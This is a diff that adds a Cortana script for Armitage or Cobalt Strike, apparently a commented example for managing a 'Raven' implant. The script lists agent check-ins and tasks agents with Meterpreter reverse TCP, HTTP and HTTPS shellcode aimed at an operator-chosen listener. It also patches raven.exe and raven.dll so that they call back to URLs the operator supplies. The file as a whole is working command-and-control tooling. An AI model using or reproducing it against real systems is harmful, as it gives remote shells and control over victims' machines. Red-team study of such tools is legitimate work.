@@ -1,0 +1,147 @@
+#
+# == A client to manage the Raven agent ==
+# 
+# Users who want to control Raven from their Armitage or
+# Cobalt Strike client should load this script. The raven
+# server will publish information that this script can
+# consume.
+#
+
+# create a popup for the Raven manager, View -> Raven
+popup view_middle {
+	item "&Raven" {
+		# &spawn is a special function. It accepts a function as an argument
+		# and runs it in a new Cortana environment. This is like "new Object()"
+		# in other programming languages. I can now have multiple Raven instances
+		# at one time. They'll work independently of each other because of the
+		# isolation &spawn provides.
+		spawn(&raven_manager);
+	}
+}
+
+# a function to task our agent...
+sub task {
+	local('$uri $host $port $shellcode');
+	$uri = table_selected_single($1, "uri")[0];
+	($host, $port) = split(":", prompt_text("listener host:port"));
+
+	# tell the framework to generate shellcode for us
+	$shellcode = generate($2, $host, $port, %(), "raw");
+
+	# publish a command for server.cna to act on
+	publish("raven_command", @($uri, $shellcode));
+}
+
+# define popups for our raven manager
+popup raven_tasks {
+	item "Meterp TCP" {
+		task($1, "windows/meterpreter/reverse_tcp");
+	}
+	item "Meterp HTTP" {
+		task($1, "windows/meterpreter/reverse_http");
+	}
+	item "Meterp HTTPS" {
+		task($1, "windows/meterpreter/reverse_https");
+	}
+	separator();
+	item "Clear" {
+		local('$uri');
+		$uri = table_selected_single($1, "uri")[0];
+		publish("raven_command", @($uri, ""));
+	}
+}
+
+sub raven_manager {
+	global('$table %checkins $id');
+
+	# fired when server.cna publishes a checkin notice for clients to consume
+	on raven_checkin {
+		# store our most recent checkin
+		local('$key');
+		$key = $1['host'] . $1['uri'];
+		%checkins[$key] = $1;
+		%checkins[$key]['last'] = "now";
+		%checkins[$key]['time'] = ticks();
+
+		# sets our table rows
+		table_update($table, values(%checkins));
+	}
+
+	# update our Raven table every 1s.
+	on heartbeat_1s {
+		local('$host $data');
+		foreach $host => $data (%checkins) {
+			$data['last'] = ((ticks() - $data['time']) / 1000) . 's';
+		}
+
+		table_update($table, values(%checkins));
+	}
+
+	# fired when user clicks "Task Raven" or "Raven EXE" buttons
+	on tab_table_click {
+		if ($3 eq "Export EXE") {
+			generate_raven(script_resource("raven.exe"));
+		}
+		else if ($3 eq "Export DLL") {
+			generate_raven(script_resource("raven.dll"));
+		}
+	}
+
+	# stop any ongoing activity related to this spawned cortana instance when the tab closes
+	on tab_table_close {
+		quit();
+	}
+
+	# display a tab with a table showing our raven checkins...
+	$table = open_table_tab("Raven", $null, 
+				@('host', 'uri', 'status', 'size', 'last'), # columns
+				@(), 					    # rows
+				@("Export DLL", "Export EXE"), 		    # buttons
+				"raven_tasks", 				    # popup hook
+				$null);					    # no multiple selections
+
+	# generate a random id that acts as a cursor identifier for all raven checkins
+	$id = rand(ticks());
+
+	# query all checkins so far and add them to our data store
+	foreach $checkin (query("raven_checkin", $id)) {
+		$checkin['time'] = ticks();
+		$checkin['last'] = "unknown";
+		%checkins[$checkin['host'] . $checkin['uri']] = $checkin;
+	}
+
+	# subscribe to all future checkins... check for changes every 5s
+	subscribe("raven_checkin", $id, "5s");
+}
+
+# this function patches raven.exe and raven.dll with user provided info
+# it will look for 1024 A's and patch our strng in there. It then saves
+# this patched function where ever the user would like it.
+sub generate_raven {
+	local('$urls $handle $data $index $saveto');
+	$urls = prompt_text("Which URLs should I call back to?\ne.g., http://host1/file1, http://host2/file2, etc.");
+	if ($urls eq "") {
+		return;
+	}
+	$urls = join(',', split(',\s+', $urls));
+
+	$saveto = prompt_file_save("");
+	if ($saveto eq "") {
+		return;
+	}
+
+	$handle = openf($1);
+	$data = readb($handle, -1);
+	closef($handle);
+
+	$index = indexOf($data, 'A' x 1024);
+
+	$urls .= "\x00";
+	$data = replaceAt($data, "$[1024]urls", $index);
+
+	$handle = openf('>' . $saveto);
+	writeb($handle, $data);
+	closef($handle);
+
+	show_message("Saved");
+}
